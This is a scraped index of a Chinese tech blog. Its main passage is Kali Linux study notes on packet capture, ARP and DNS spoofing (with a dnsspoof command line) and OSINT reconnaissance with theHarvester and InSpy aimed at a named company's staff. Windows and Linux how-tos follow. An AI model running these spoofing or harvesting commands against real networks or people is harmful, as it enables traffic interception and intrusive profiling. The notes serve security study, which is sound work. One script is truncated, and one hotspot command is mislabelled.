0x024.捕获数据包事实上，我们所做的是捕获数据帧。因为我们捕获的层是OSI网络模型的第二层，第三层的数据则被称为数据包，第四层根据协议称为数据报文或段。 tcpdump 是Linux上的数据包捕获重程序。直接运行tcpdump会产生DNS请求和响应，它默认会将源地址和目标地址的IP转换为主机名，加上-n参数可以禁用该转换。 这程序还支持-v选项以显示更为详细的输出。同时，它支持多个-v选项，最详细的级别是-vvv。同时，使用-w [文件名]选项可以将数据帧捕获到数据包捕获（pcap）文件中，然后就可以将其导入其他工具进行分析。 tcpdump的另一个重要特性就是伯克利数据包过滤器（BPF），这组字段允许用户对正在捕获的数据包做限定。用法是，在tcpdump指令后附加一系列参数，并用and或or等布尔逻辑词连接他们。支持的参数有：port [端口号]，tcp/udp/icmp，src host/dst host [主机名/IP]等一系列，详见man tcpdump。 捕获完成后，需要对数据帧进行分析。你会发现这很麻烦，因为帧太多了。所以借助其他工具是十分必要的。 Wireshark 是最好的分析工具之一。它也可以捕获自身的数据包并存储并生成pcap文件。它提供了一种深入挖掘数据包内容的方法，因此学习用它捕获数据包不是重点，用它分析数据包才是。 使用Follow TCP Stream，我们可以查找我们感兴趣的数据帧。它会为我们做大量的分析工作，比如将客户端数据标红，服务端数据标蓝，将校验和不匹配的数据包标黑等等。 同时，Wireshark还提供了统计菜单，其中包含协议层次结构的统计图。它有助于识别未知的协议，并确定使用频次最高的协议，以及定位攻击来源等。 这款软件在Kali上是开箱即用的，不过也可以安装到其他系统上。作为一个实用工具，它有很大的价值，值得我们仔细学习。 0x025.病毒攻击 其实和病毒没啥关系？ 现如今，很多网络都是交换式的。你的设备只会把消息发送到收件人所在的网络端口。在过去，交换机是单拨设备，但是集线器是广播设备，我们会用集线器。进入集线器中的消息都会被发送到集线器中的其他端口，让端点根据MAC地址确定数据帧属于谁。集线器只是一个转发器。 交换机则会读取第二层的首部信息来确定MAC地址。他知道拥有该MAC地址系统所在的端口，它是通过监控每个端口的流量实现上述功能的。源主机的MAC地址会附加到端口上，交换机通常将映射存储到CAM（内容寻址存储器）中。交换机并不是必须扫描整个列表，而是直接引用MAC地址来查找详细信息。该内容成为交换机引用的地址以获取端口信息。 这意味着，你可以配置你所在网络的交换机，把流量从一个或多个端口发送到另一个端口。这是一面镜子，而不是重定向。收件人获取流量，而你也将获得数据包，从而可以从无权访问的系统中收集信息。这就是欺骗攻击。 ARP欺骗ARP（地址解析协议）是一种简单的协议。假定你的系统需要在网络上通信，但它只有IP地址，它会向网络发送（宿主）请求。具有这IP地址的系统将会通过天填写MAC来响应。然后你的系统会得知正确的MAC地址，并将其保存的消息发送到正确的目的地。 你的系统会缓存它所看到的所有映射以提高效率。ARP假设系统表明它拥有IP地址的唯一时间是在有人询问时，然而事实并非如此。如果我让系统发送ARP响应说我拥有你的IP地址，并且任何尝试访问该IP地址的人都应该发送到我的MAC地址，我就会收到本该发送给你的消息。通过发送一个ARP响应，声明你的IP地址在我的MAC地址上，就会把我置于通信双方的中间位置。不过这是单向的，如果我的MAC地址欺骗了你的IP地址，我只会收到应该给你的消息。 为了得到会话另一端的信息，我需要欺骗其他地址。比如你可以欺骗本地网关，以便捕获你与互联网之间的所有通信。需要注意的是消息只会发送给我，我还必须将消息转发给预期目标，否则通信就会停止，因为人们没有收到他们预计会收到的信息。这要求我们的系统将初始消息转发给被攻击目标。 因为ARP缓存会超时，如果我们没有继续让系统转发这些消息，最终缓存会超时，以至于我们无法获得我们想要的信息。这意味着需要继续发送这些消息，即未要求的ARP消息。它是一个尚未被请求单仍然提供的消息。这行为有合理的理由，但是并不常见。 我们将会使用Ettercap，它支持基于CLI的GUI，或者WIndows风格的GUI。除了ARP攻击，它还支持其他类型的第二层攻击，比如DHCP中毒和ICMP重定向攻击。它们都是让你从本地网络的其他系统中获取数据流量的方法。 DNS欺骗捕获本地网络（LAN）之外流量的一种方法是使用DNS欺骗攻击。在此攻击中，你会干扰DNS查找，以确保目标主机解析域名为IP地址时，目标将获取你提供的IP地址。这种攻击也称缓存中毒攻击。我们通常会利用目标附近的DNS服务器，这通常是一个缓存服务器。 一旦你能访问缓存服务器，就可以对缓存进行适当的修改，将目标转向你控制的系统。你还可以通过编辑缓存向其中添加不存在的条目。但这要求你破坏远程DNS服务器。 在LAN中，借助dnsspoof程序，可以在本地模拟这一攻击。攻击者如果可以看到DNS请求，就可以捕获标识符并将其添加到攻击者提供的IP地址响应中。但是，要在交换式网络中做到这一点则需要额外步骤。 准备工作：你需要一个将IP地址映射到主机名的主机（hosts）文件。获得主机文件之后，就可以运行dnsspoof： 1dnsspoof -i eth0 -f myhosts udp dst port 53 上面的-f选项引用了BPF来过滤捕获的数据包。同样，也可以借助Ettercap/arpspoof来完成这一点。 0x03.侦察攻击之前，首先得确定攻击范围。就好比使用渗透工具时，得提供一组指定的参数。我们需要确定目标是什么，包括系统和人。为此，我们需要执行侦察任务。借助Kali的工具，我们可以大量收集关于公司及其员工的信息。 0x031.什么是侦察它指一项收集信息的初步调查的活动。其定义一直以来都与军事活动有关系。收集信息时，最好不要产生太多“噪声”。我们需要在和目标保持一定距离的情况下收集信息。这需要灵活应对。 关于OPeration SECurity（运营安全），二战期间有一个类似的说法：“口风不严会导致沉船”。也就是说，与任务相关的信息都必须保密，任何信息泄露都有可能危及运营。 互联网的一个特点就是，你与其打交道的时间越长，留在它上面的信息就越多。这对于企业和个人都是如此。由于这些信息的重要性，已经产生了很多类似工具，使得我们可以更容易地获取它们。这不仅包含CLI工具，还包括网站，浏览器插件和其他程序。我们会关注一些Kali中可用的工具，以及一些可以添加到Firefox中的扩展。 0x032.开源智能工具如今，基本上所有人在互联网上都留有痕迹，即使不注册社交软件也是如此。首先是任何有手机号的人都可以通过互联网被找到。 开源智能指的是，你从公共服务中找到的任何内容。比如无论是否可能被视为公开的政府记录，被视为公开信息来源的邮件列表档案。开源一词，不仅仅适用于软件，也同样适用于其他信息。 搜索引擎为我们提供了大量信息，学习使用它的技巧有助于我们过滤无关信息以节省大量时间。 对于员工信息，LinkedIn网站可以识别公司及员工的大数据挖掘资源库。求职网站也可以提供相关公司的大量信息。通过公司的招聘岗位，可以分析公司的基础架构类型。Twitter/Facebook/微博等社交网站也可以提供某个公司及其员工的一些信息。 Kali提供了检索这类信息的工具。程序可以自动从搜索引擎和其他Web网站提取大量信息。类似theHarvester这样的工具可以节省大量时间并且简单易用。Maltego这样的工具可以自动提取大量信息，并直观展示信息间的联系。 Google与黑客攻击Google搜索引擎提供了一组用户可以修改搜索请求的关键字，从而可以查看更紧凑的查询结果。这种搜索有时被称作Google Dorks，使用关键字识别特定页面的整个过程被称为Google Hacking。有下列关键词可用： site:keyword 匹配特定网站/域名，主机名可以省略。 filetype:keyword 匹配文件类型。 inurl:和intext: 第一个只搜素关键字相关的网址，第二个只显示包含搜索词的文本。 cache: 从Google的缓存中提取网页。它可以获取已经关闭的网站的数据。 同时，可以使用AND和OR等布尔运算符来进一步组合限定搜索结果，还可以使用引号确保以正确的顺序获得单词模式。 自动化信息抓取搜索十分耗时，Kali提供了一些工具来提高效率。 theHarvester 它能够从多个数据源搜索信息，包括Google，Bing，LinkedIn，Twitter，PGP等。 12theharvester -d oreilly.com -b pgp # 搜索用域名oreilly.com注册的PGP密钥theharvester -d gmail.com -l 1000 -b linkedin # 搜索使用过Gmail的任何人 如果要多次搜索，可以编写个小脚本来减轻工作量。下面的脚本通过命令行中的几个域名对多个数据源进行搜索。 123456789101112#!/usr/bin/pythonimport sysimport osif len(sys.argv) &lt; 2: sys.exit(-1)providers = ['google', 'bing', 'linkedin', 'pgp', 'google-profiles']for a in providers: cmd = 'theharvester -d {0} -b {1} -f {2}.html'.format(sys.argv[1], a, a) 上面的脚本对多个数据源进行搜索并将结果保存到相应的HTML文档中。 LinkedIn的数据（在国外）十分有用，因此我们使用InSpy对其进行检索： 1inspy --empspy /usr/share/inspy/wordlists/title-list-large.txt oreilly InSpy提供的单词列表只是由文本文件构成的。我们使用的是其中的头衔列表（title-list-large.txt）。你可以根据需要向其中添加关键字。 借助InSpy也能获取公司的技术列表： 1inspy --techspy /usr/share/inspy/wordlists/tech-list-large.txt oreilly 注意，InSpy需要安装到Kali中才能使用。 Recon-NG在设置完apikey之后，我们就可以用它的各个模块来搜索信息。使用show列出查询结果，reporting模块可以获取/导出数据库内容。 Maltego这是一个GUI程序。其中有一些模块可供使用，通过machine，我们可以自动化使用模块完成搜索。 0x033.DNS侦察和WhoisDNS维护着一张域名-IP映射表，这使得我们不必维护一个庞大的主机表。DNS和RIRs（区域互联网管理机构）有关。 DNS侦察区域互联网注册服务商","link":"/2022/10/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/Kali%20Linux%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Ubuntu下禁用Apache浏览","text":"禁止目录浏览让别人知道你的网站目录结构直接查看你目录下的所有文件是很危险的一个事情。所以一般我们会关闭Apache的这项功能。下面是步骤（对于Ubuntu）。 1.打开apache2配置文件 1vim /etc/apache2/apache2.conf 2.找到如下位置中的 Options Indexes FollowSymLinks 注释掉并在其下一行添加 Options None，如下图3.保存后重启apache2 1/etc/init.d/apache2 restart 4.再次访问目录会出现禁止浏览目录的提示 禁止特定类型文件访问打开apache2配置文件： 1vim /etc/apache2/apache2.conf 在最后新增以下内容： 123456#禁止.inc扩展文件的访问#可根据实际需要替换成其他文件类型&lt;Files ~ &quot;\\.inc$&quot;&gt; Order allow,deny Deny from all&lt;/Files&gt;","link":"/2020/12/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/Ubuntu%E4%B8%8B%E7%A6%81%E7%94%A8Apache%E6%B5%8F%E8%A7%88/"},{"title":"wsl挂载or卸载设备","text":"转载自博客园。原链接:https://www.cnblogs.com/marklove/p/11905833.html Windows Subsystem for Linux （WSL）挂载移动硬盘U盘 卸载 c d 盘wsl命令行电子手册 https://docs.microsoft.com/zh-cn/windows/wsl/reference https://docs.microsoft.com/zh-cn/windows/wsl/reference?redirectedfrom=MSDN 重装某系统 https://www.cnblogs.com/wswind/p/9879539.html https://www.bbsmax.com/A/rV57bgVEJP/ WSL想通过移动硬盘处理一些数据，结果进去了无法发现移动硬盘，于是搜了好久也没有一个正确的解决办法，终于找到一个，现在贡献出来与大家共享。 WSL比起linux挂载硬盘简单一些。而且windows本身自己的硬盘位ntfs格式，所以移动硬盘感觉挂载要比单纯的linu下ntfs挂载更加稳定一些。个人感觉而已….无法验证。 假设你的移动硬盘在windows下显示为 G:\\ 新建文件夹g sudo mkdir /mnt/g 挂载盘符g sudo mount -t drvfs G: /mnt/g 3.大功告成。进入/mnt/g即可与windows下一摸一样。 4.弹出移动硬盘，这样才能在windows下正常弹出，否则是会一直占用的。 sudo umount /mnt/g","link":"/2021/06/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux/WSL%E6%8C%82%E8%BD%BDor%E5%8D%B8%E8%BD%BD%E8%AE%BE%E5%A4%87/"},{"title":"UWP安装包的获取","text":"UWP应用概述 UWP即Windows 10中的Universal Windows Platform简称。即Windows通用应用平台，在Windows 10 Mobile/Surface/PC/Xbox/HoloLens等平台上运行，uwp不同于传统pc上的exe应用，也跟只适用于手机端的app有本质区别。它并不是为某一个终端而设计，而是可以在所有Windows10设备上运行。 UWP应用的安装文件后缀为.appx。 所以这和只能在电脑上用……好像也没啥区别（？ 一般而言，.appx格式文件只能在Microsoft Store上下载。.appx从正常途径一般不能获取到。目前而言，我知道的获取途径有两个。 Microsoft Store下载 + 工具抓包获取下载路径 用链接获取工具获取 这里先说下最简单的（也就是第二个）。 工具法获取链接工具地址（在线页面，点开直接访问即可）：https://store.rg-adguard.net/ 首先，我们进入微软官网，点击搜索，输入要下载的应用，进入详情页。 然后，复制详情页链接。 接着，进入工具页，粘贴链接并点击对勾确认。默认选择RP就可以了。 等待一会，出现链接后右键复制，完成后进入x雷下载即可。 接着，进入系统设置&gt;更新和安全&gt;开发者选项&gt;打开开发人员模式。 然后，打开下载目录。 双击，直接安装。 完事儿。 抓包法获取链接懒得写了。刚好百度经验有人写了，就不多废话了。 链接：点击进入 虽然百度很屑，不过还是离不开（摊","link":"/2021/06/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/UWP%E5%AE%89%E8%A3%85%E5%8C%85%E7%9A%84%E8%8E%B7%E5%8F%96/"},{"title":"Win10使用命令行启动WiFi热点","text":"使用管理员权限运行cmd，然后键入以下指令： 12netsh wlan set hostednetwork mode=allownetsh wlan set hostednetwork ssid=您想要的无线网络的名称 key=您想要设置的密码 然后在网络和Internet界面对新增的东西共享网络，再启动承载网络： 1netsh wlan start hostednetwork 下面是一些常用指令： 1234#停止netsh wlan start hostednetwork#查看详情netsh wlan show hostednetwork","link":"/2021/12/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Win10%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%90%AF%E5%8A%A8WiFi%E7%83%AD%E7%82%B9/"},{"title":"Win10删除此电脑中多余图标","text":"原文地址：http://mip.xitongcheng.com/jiaocheng/win10_article_11699.html 具体方法 1、按WIN+R调出运行，然后输入 regedit 回车，打开注册表编辑器。 2、在注册表中定位到：HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\NameSpace项。 3、选中“NameSpace”后，在右键窗口中删除所有值。 4、退出注册表后，此电脑中多余图标消失。","link":"/2021/07/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Win10%E5%88%A0%E9%99%A4%E6%AD%A4%E7%94%B5%E8%84%91%E4%B8%AD%E5%A4%9A%E4%BD%99%E5%9B%BE%E6%A0%87/"},{"title":"Win10添加开机启动项","text":"方法一：开机启动文件夹1、我们打开文件夹：C:\\Users（用户）\\Administrator（当前用户名）\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs（「开始」菜单）\\Programs（程序）\\Startup（启动 ）即可找到启动文件夹 PS：也可以在运行中粘贴以下路径回车打开 %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 2、然后我们把软件的快捷方式，或是文件放到该启动文件夹中，Win10开机后就可以自动运行了。 方法二：注册表添加启动项1、打开运行，输入“regedit”，打开注册表。 2、在注册表中找到如下位置HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run，右键“Run”新建一个字符串类型的键值。 3、右键新建的键值，选择“修改”，将数值名称改为 你要启动的程序名称如：ctfmon.exe，数值数据改为 程序所在位置的路径 如：C:\\windows\\system32\\ctfmon.exe (直接不能修改名字的，可以先点击重命名，改好名字，再点击修改，修改数值数据) 4、最后，再重新启动win10你设置的程序就可以在Win10开机后自己启动了！ 方法三：任务计划程序1、在“我的电脑”-》“右键”-》“管理” ； 2、这时会打开任务计划程序，右边有一个创建基本任务和一个创建任务，我们先点开创建基本任务。 3、这个时候就需要你写一些名字啊，描述啊什么的，可以随便填一填，然后下一步。 4、这个时候要选择什么时候触发，可以选择什么时候开始执行。小编选择的是用户登录时，就是开机，输入密码登录后就执行，然后下一步。 5、选择一个操作，小编选择启动程序，然后选择一个批处理，因为我们的批处理不用传参，可选参数就不管了，直接下一步。 6、然后就完成啦，可以试试，开机的时候，会不会自启动。","link":"/2021/07/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Windows/Win10%E6%B7%BB%E5%8A%A0%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9/"},{"title":"绿色软件制作方法","text":"此文系转载，发布时间：2011-05-27 11:28:21 绿色软件的制作，简称软件的”绿化”，绿色软件的制作实际上就是我们自己完成安装程序的工作。没有什么固定的方法，基本上是猜测加上试验，不同类别的绿色软件分别有不同的制作策略。 拿到一个新的软件，想要制成绿色软件的话，我一般遵循如下步骤： 1 判断。就是指猜测这个软件能不能制成绿色软件，从功能，从你对它的了解，如果你觉得这个软件和系统的关系非常紧密，就不要继续下去了，还是用原始的安装程序最保险最方便，这样的例子有directx9 ，IE6，Norton的反病毒软件等等。这样的判断可以节省你的时间，当然你可以忽略这一步，尝试制作绿色软件，那么就转到第2步。 2”绿化”。对于不同的软件有不同的方法，没有一定的规则，但是总的来说，就是理解软件的安装过程，转换为绿色安装，在这个过程中，可能需要尝试多个方法，也可能最后由于软件的复杂性或者某些特性，导致无法绿化。要有失败的思想准备，具体的绿化方法随后讲述。 3 测试。”绿化”后的测试最好到你个全新安装的操作系统中测试，而且如果你要在多个操作系统中使用这个软件的话，还要在其他的操作系统中测试，有的软件的文件随着操作系统的不同而不同，这个时候你需要在不同的操作系统中进行”绿化”过程，最后综合为一个完整的适应多个操作平台的绿色软件。 “绿化”方法，需要根据经验选择不同的”绿化”方法，也可能需要不断尝试不同的方法，直到成功为止。按照先易后难的次序，具体的方法包括：1 解压缩。这是最简单的一种方法，就是指尝试能不能直接解开软件的压缩包。用Winzip和Winrar试一试，看看能不能直接打开压缩的安装文件，如果不能打开，那么就换别的方法。如果可以，那么恭喜，这个软件多半是属于绿色安装的软件（有个别例外，如EmEditor），把压缩包中的文件直接解压到目标路径，然后测试软件的功能是否正常，如果功能正常，那么”绿化”就成功了，如果使用不正常，那么就换别的方法。这一类软件的特点是安装程序的工作完全可以由软件自身来完成。2 安装然后卸载。也是比较容易的方法，完全是体力劳动，就是指直接安装这个软件，然后把程序复制出来，最后卸载安装程序。如果这个软件的安装程序的作用仅仅是复制文件和生成快捷键等工作，那么就属于绿色安装，可以使用这个方法。最后测试软件的功能是否正常，如果功能正常，那么”绿化”就成功了，如果使用不正常，那么就换别的方法。3 反编译安装程序。这个方法需要动脑筋，就是根据安装程序所用的制作工具，选择相应的反编译程序，然后阅读反编译出的安装脚本，制作绿色软件。目前的软件大多使用专门的安装工具制作，如InstallShield，Wise，Inno Setup，Windows Installer，NSIS(Nullsoft),Installer VISE,其中Windows Installer格式的安装文件（就是MSI，MST为后缀的文件），可以通过微软的免费工具Orca打开查看，InstallShield格式的安装文件也有很多免费的工具可以解压缩和查看脚本。当然专门的安装工具很多，有许多安装程序没有相应的反编译程序，这种时候，就无法使用这个方法了。4 观察反安装程序和log文件。现在的软件安装完成后绝大多数都带有卸载方法。卸载是安装的逆过程，如果知道怎么卸载，那么也可以推测出如何安装。由专门的安装工具制作的反安装程序，一般都是根据某一个文件中的信息来卸载的，可以用一个纯文本的编辑器打开这个文件。个别情况下这个文件完全不包含可读信息，就只好换用其他方法了。具体过程就是先采用方法2，然后理解反安装过程，最后根据反安装的信息制作绿色软件。5 比较系统快照。当前面的方法都失败的时候，可以试一试这个方法。具体思路就是首先在安装软件之前，把系统的状态记录下来，主要包括注册表和系统目录的所有的文件状态。然后就是安装软件。安装完成后，再一次记录系统状态。最后就是比较前后两个系统状态的不同，而得知安装程序所做的工作。这个工作一般由专门的软件完成，如免费工具Regshot，免费工具inctrl5（http://www.pcmag.com/article2/0,4149,9882,00.asp），微软公司的sysdiff工具（可以从Windows2000的资源工具箱中得到），或者WinInstall LE（在Windows 2000 Sever 光盘的目录VALUEADD3RDPARTYMGMTWINSTLE中）。在多数时候，仅仅需要对比安装前后注册表的不同，这时候还有大量的注册表工具可以选用。在得出系统差异后，把差异分解为两个部分：文件部分和注册表部分。文件部分指的是向系统目录拷贝的文件，以及作为COM组件注册的文件，还有与这些文件相关的注册表部分。注册表部分单单指其余的注册表的变化。对于文件部分，可以进一步区分出必须要往系统目录拷贝的文件（这种情况是少数）和可以放在软件的安装目录的文件。对于注册表部分，区分出由这个软件的安装程序本身所作出的注册表操作和注册COM组件时候的注册表操作，抛弃其他程序（如资源管理器Explorer）的操作。根据所有这些，写一个拷贝文件，注册COM组件和导入注册表的批处理文件，就可以完成绿色软件的制作了。当注册表文件中含有路径信息的时候，可以手工修改注册表文件或者把注册表文件转化为INF文件从而实现全自动的路径处理。6 直接导出注册表，寻找自注册的COM组件。这个方法是上面的方法5的简化版，现在软件的配置大多写在注册表中的”HKEY_LOCLAL_MACHINESOFTWARE软件公司名字”和”HKEY_CURRENT_USERSOFTWARE软件公司名字”这2个键下面，直接对把这2个注册表键导出到REG文件中。自注册的COM组件都需要导出如下4个函数：DllCanUnloadNow，DllGetClassObject，DllRegisterServer， DllUnregisterServer，可以用vc自带的depend.exe找出哪一个动态链接库是自注册的COM组件。最后写一个批处理文件用regsvr32.exe注册COM组件和用regedit.exe导入注册表。 通过上面分析安装程序的动作，把安装程序的工作分解为复制文件，注册COM组件，安装服务驱动，注册表配置等几个部分，虽然注册表配置可以覆盖注册COM组件，安装服务驱动等操作步骤，但是把这些明显分割出来有助于制作绿色安装的软件。对于需要更复杂的步骤来安装的软件，还是使用原来的安装程序比较保险。 例如:winrar3.30 和Winzip9.0，采用方法1，解压缩。这个方法非常简单，从天空软件站下载Winzip90.exe和winrar330sc.exe，在一个安装了Winrar的系统上，用鼠标右键选择下载的文件，运行右键菜单中的用Winrar打开的命令，然后把文件解压到我们的目标路径，如E：tools目录，就可以了。然后分别对Winzip9和Winrar进行设置就可以了。运行winzip9目录中的Winzip32.exe，进行winzip的设置。Winrar也是一样，运行Winrar.exe，打开菜单选项-〉设置，弹出一个对话框，选择标签–集成，如图WinrarSetting.png，逐项对Winrar设置。当拷贝到U盘而到新的机器上运行时，需要重复这些设置过程。 这一类软件的特点是安装程序的工作完全可以由软件自身来完成，从而完全抛开安装程序，或者说安装程序的工作也就是解压缩。类似的软件还有一些，最简单的测试办法就是看看Winrar能否直接打开压缩的安装程序。也可以采用方法2，过程基本上和方法1一样。 方法2就不具体说明了，仅仅指出有许多程序属于这个类别，如Myie2，GreenBrowser，qq，BPFTP Server，IDA_Pro_Standard_4.5.1.770，FinalData，EASYRECOVERY 6.03，腾逊公司的TM等等。flashget是大家用得比较多的一个软件，可以多线程下载并且下载管理的功能也很方便，从天空软件站sky.com下载flashget1.60a国际版，运行一下，如图flashget_wise.PNG，然后取消安装。从图上可以看出flashget1.60a国际版是使用Wise制作的安装程序，从网上下载wungui程序，非常容易的把安装程序解压缩到一个目录中，如图flashget160a.PNG，观察Maindir目录，其中有两个DLL文件Jccatch.dll和fgiebar.dll，进一步察看这两个动态库文件的导出函数，可以知道这两个DLL文件都是自注册的COM组件，写一个批处理文件install.bat来注册这两个DLL： REGSVR32 JCCATCH.DLL /s REGSVR32 fgiebar.dll /s 经过测试，功能正常，并且可以从浏览器IE中用鼠标的右键菜单激活flashget，功能完全，下面考虑卸载过程。运行Regedit.exe，发现flashget在注册表中的路径是[HKEY_CURRENT_USERSoftwareJetCarJetCar]，写一个注册表文件unflashget.reg删除这个路径，如下：REGEDIT4 ; flashget [-HKEY_CURRENT_USERSoftwareJetCarJetCar] 同时写一个批处理文件uninstall.bat来卸载这两个DLL文件并导入unflashget.reg： Regedit unflashget.reg /s REGSVR32 JCCATCH.DLL /s /U REGSVR32 fgiebar.dll /s /U 随后就是删除一些我们用不到的文件，比如language目录的绝大多数欧洲的语言文件，这时候这个绿色版本就做好了。把制作好的绿色的flashget拷贝到U盘上，需要用的时候，直接执行里面的install.bat文件就可以了（注意，要在flashget的目录运行批处理文件），不需要任何文件拷贝。 我看到有人提到用优化大师提取falshget的注册表，然后直接导入注册表来制作绿色的flashget，这样做是不行的，从我前面的步骤来看，注册2个DLL文件必然在注册表中引入了绝对路径，那么如果直接提取注册表的话，就必须根据当前的路径来修改注册表中的路径，否则的话制作的绿色版的flashget只能在固定的目录运行。在制作flashget绿色版的时候，我同时使用了方法3和方法6，使用方法3的目的就是避免安装程序对系统作的修改，这样可以直接在当前系统进行测试，而不需要到另外一个没有安装过flashget的系统测试。 Emeditor是方法1的一个反例。Emeditor可以从开发商主页http://www.emurasoft.com/下载，是一个简单好用的文本编辑器，支持多种配置，自定义颜色、字体、工具栏、快捷键设置，可以调整行距，避免中文排列过于紧密，具有选择文本列块的功能(按ALT 键拖动鼠标)，并允许无限撤消、重做，总之功能多多，使用方便，是替代记事本的最佳编辑器。 下载emed404epx.exe后，发现用Winrar可以打开，解压后，运行Emeditor，发现丢失了预定义的多种文本格式的语法配置，看来这样做不行，只好采用方法5了。请随我一步步进行，步骤如下：1 扫描系统，制订系统快照。这里我仅仅记录当前系统的注册表（因为我认为Emeditor不会向系统目录拷贝文件，如果判断错误，就会导致”绿化”失败），运行ART（Advanced Registery Tracer），扫描一遍注册表。如图emeditor_snap.PNG，不要关闭ART。2 安装Emeditor。随便安装到哪里，反正一会就卸载。安装好后，如果需要的话，更改配置，或者配置新的文件类型，例如我就增加了NFO文件类型，设定和NFO文件相关联的字符集，这样可以用Emeditor直接察看NFO文件，不需要专门的察看工具了。3 记录系统变化。再一次扫描系统，给系统作快照，从ART里面再一次扫描注册表，然后选择菜单命令Registry-〉compare here或者直接用键盘F10，比较结果如图emeditor_compare.png，点击图中那个save to redo file的按钮，存储为Emeditor.reg文件，关闭ART。4 复制并卸载。复制安装好的Emeditor目录到其他路径，然后卸载Emeditor程序。5 分析。打开刚刚导出的Emeditor.reg文件，这是一个巨大的reg文件，单单是REG文件就有1兆多，不过不用担心。阅读注册表后，删除和emeditor无关的注册表项后，如仅仅和资源管理器相关的注册表部分，发现剩下的注册表文件可以分成3个部分。一部分在位于注册表的这个路径[HKEY_LOCAL_MACHINESOFTWAREEmSoft]，里面大部分不涉及路径，只有一项记录了Emeditor的路径，就是”ModulePath”=”h:EmEditor4”；还有一大部分在注册表的这个路径下面[HKEY_CURRENT_USERSoftwareEmSoftEmEditor v3]，里面有很多项都涉及了Emeditor的路径，如”Tmpl”=”h:EmEditor4template.xml”；还有就是和Emeditor和txt文件后缀向关联的注册表设置，把Emeditor设置为IE中缺省的源代码察看工具的注册表设置以及注册COM组件EMEDSHL.DLL的注册表部分（和InProcServer32相关的就是）。6 “绿化”。6.1 把位于注册表路径路径[HKEY_LOCAL_MACHINESOFTWAREEmSoft]的内容存储到emeditor_HKLM.reg文件中，把位于注册表路径[HKEY_CURRENT_USERSoftwareEmSoftEmEditor v3]的内容存储到emeditor_HKCU.reg文件中，把剩下的内容首先除掉COM组件EMEDSHL.DLL的相关部分，然后存储到emeditor_assoc.reg文件中。6.2 把emeditor_HKLM.reg文件和emeditor_HKCU.reg文件中涉及到路径的注册表内容抽取出来，存储到emeditorConf.reg文件。6.3 把emeditor_assoc.reg文件和emeditorConf.reg文件用INF的语法转换为INF文件，或者用一个免费小工具reg2inf.exe自动转换，然后把转换得到的emeditor_assoc.inf文件和emeditorConf.inf文件中的路径h:EmEditor4全部用%01%代替。下面是emeditorConf.inf文件的内容：[Version] Signature=”CHICAGO”[DefaultInstall] AddReg=EmeditorConf_AddReg hklm,”SOFTWAREEmSoftEmEditor v3Common”,”ModulePath”,,”%01%”hkcu,”SoftwareEmSoftEmEditor v3ConfigC++”,”Tmpl”,,”%01%template.cpp”hkcu,”SoftwareEmSoftEmEditor v3ConfigCSS”,”Tmpl”,,”%01%template.css”hkcu,”SoftwareEmSoftEmEditor v3ConfigHTML”,”Tmpl”,,”%01%template.htm”hkcu,”SoftwareEmSoftEmEditor v3ConfigJava”,”Tmpl”,,”%01%template.java”hkcu,”SoftwareEmSoftEmEditor v3ConfigJavaScript”,”Tmpl”,,”%01%template.js”hkcu,”SoftwareEmSoftEmEditor v3ConfigJSP”,”Tmpl”,,”%01%template.jsp”hkcu,”SoftwareEmSoftEmEditor v3ConfigPerl”,”Tmpl”,,”%01%template.pl”hkcu,”SoftwareEmSoftEmEditor v3ConfigPHP”,”Tmpl”,,”%01%template.php”hkcu,”SoftwareEmSoftEmEditor v3ConfigPython”,”Tmpl”,,”%01%template.py”hkcu,”SoftwareEmSoftEmEditor v3ConfigRuby”,”Tmpl”,,”%01%template.rb”hkcu,”SoftwareEmSoftEmEditor v3ConfigTeX”,”Tmpl”,,”%01%template.tex”hkcu,”SoftwareEmSoftEmEditor v3ConfigVBScript”,”Tmpl”,,”%01%template.vbs”hkcu,”SoftwareEmSoftEmEditor v3ConfigVBScript for EmEditor”,”Tmpl”,,”%01%template.vbee”hkcu,”SoftwareEmSoftEmEditor v3ConfigWindows Script”,”Tmpl”,,”%01%template.wsf”hkcu,”SoftwareEmSoftEmEditor v3ConfigXML”,”Tmpl”,,”%01%template.xml”** 写一个批处理文件install.bat，内容如下：regedit emeditor_HKLM.regregedit emeditor_HKCU.regRUNDLL32.EXE SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 .emeditorConf.infregsvr32 EMEDSHL.DLLRUNDLL32.EXE SETUPAPI.DLL,InstallHinfSection DefaultInstall 128 .emeditor_assoc.inf6.5 把install.bat，emeditorConf.inf，emeditor_assoc.inf，emeditor_HKLM.reg，emeditor_HKCU.reg5个文件存储到Emeditor的目录，删除其余的注册表文件。6.6 根据安装步骤和install.bat，写出相应的卸载的批处理文件，这个比较简单。 经过测试后，Emeditor工作正常，也可以注释掉install.bat的最后2行语句，这样Emeditor就不会和系统关联，上面的步骤是在windows 2000上的，对于win9x也同样，而且win9x下面的emeditor的配置文件和windows 